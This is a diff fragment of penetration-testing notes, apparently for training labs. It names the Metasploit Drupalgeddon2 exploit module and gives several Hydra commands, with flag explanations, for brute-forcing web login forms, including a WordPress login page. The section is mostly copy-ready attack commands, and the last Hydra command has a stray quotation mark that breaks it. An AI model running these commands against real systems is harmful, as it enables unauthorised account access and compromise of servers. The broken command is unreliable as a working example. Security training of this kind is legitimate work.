+```
+exploit/unix/webapp/drupal_drupalgeddon2
+```
+
+#### HTTP POST Form Attack Using Hydra
+
+To launch a brute force attack against an HTTP POST form, you can use the following command with Hydra:
+
+```
+hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
+```
+
+In this command:
+
+- Replace `http://10.10.10.10/` with the target URL.
+    
+- Adjust the `/login.php:user=^USER^&password=^PASS^:Incorrect credentials` string to match the form data and failure message.
+    
+- The `-L` flag specifies a file with usernames, and `-P` specifies a file with passwords.
+    
+- The `-f` flag tells Hydra to stop after the first correct password is found.
+    
+- The `-V` flag increases the verbosity, showing the attempts in the output.
+
+### Attacks General
+
+Brute force web form with Hydra
+```
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password"
+```
+
+
+```
+hydra -L /usernames -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:login_error"
+```
